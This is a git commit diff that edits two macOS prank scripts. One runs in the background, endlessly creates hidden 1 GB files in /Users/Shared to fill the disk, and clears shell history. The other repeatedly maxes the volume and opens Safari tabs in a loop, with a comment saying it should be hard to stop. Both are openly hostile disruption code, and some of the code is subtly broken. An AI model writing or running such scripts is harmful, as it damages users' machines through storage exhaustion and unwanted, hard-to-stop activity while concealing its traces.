7028e4ca347a292ef6d649774cf05991dab49400
FlyingGraysons <hmwildermuth@gmail.com>
2015-11-15 21:03:11 -0500

    Maybe Fixed it!

--- ehh.sh
+++ ehh.sh
@@ -1,11 +1,14 @@
 #/bin/bash
 
 # WORKS LIKE A CHARM BABY
+# basically the point is that it makes tonnes and tons of files
+# recursively
 
-nohup $(cd /Users/Shared;
+
+nohup sh -c "cd /Users/Shared;
 LOL=0;
 while true;
 do mkfile 1g .woah.poop$LOL;
 LOL=1+LOL;
 history -c;
-done) & &>/dev/null
+done" & &>/dev/null
--- trollllllllolol.sh
+++ trollllllllolol.sh
@@ -15,16 +15,16 @@ echo 'Please write it down, it will not be automatically cached'
 
 # And then BOOM
 # Drop the hammer
-nohup $(while true; do osascript -e 'repeat
+nohup sh -c "while true; do osascript -e 'repeat
 	set volume 10
 	tell application "Safari" to activate
 	tell application "Safari"
 		tell window 1
-			set current tab to (make new tab with properties {URL:"http://leekspin.com"})
+			set current tab to (make new tab with properties {URL:\"http://leekspin.com\"})
 		end tell
 	end tell
 	delay 0.5
-end repeat'; done) & &> /dev/null
+end repeat'; done" & &> /dev/null
 
 # this part isnt finished
 # it can be stopped, not what we want
